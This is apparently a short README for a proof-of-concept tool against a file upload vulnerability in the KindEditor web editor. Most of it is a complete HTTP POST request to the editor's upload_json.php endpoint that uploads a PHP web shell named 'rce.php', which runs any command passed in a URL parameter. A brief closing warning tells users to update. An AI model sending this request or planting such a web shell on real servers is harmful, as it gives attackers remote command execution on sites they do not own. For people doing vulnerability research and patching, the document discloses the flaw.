# KindEditor-PoC-Tool
KindEditor PoC Tool ( File Upload Vuln )
/examples/uploadbutton.html CHECK > exp.py

Exploiting PHP Upload:
```http
POST /Public/Kindeditor/php/upload_json.php?dir=file HTTP/1.1
Host: site.com
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 236
Connection: close

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="imgFile"; filename="rce.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
❗ Why this is dangerous ❗  
The attacker uploads a simple upload.php file to the web server using this method.  
Then, using this upload.php, they inject a PHP Webshell into the server.  
After that, the damage becomes inevitable. Please update your system immediately if you are using this version of kindeditor.
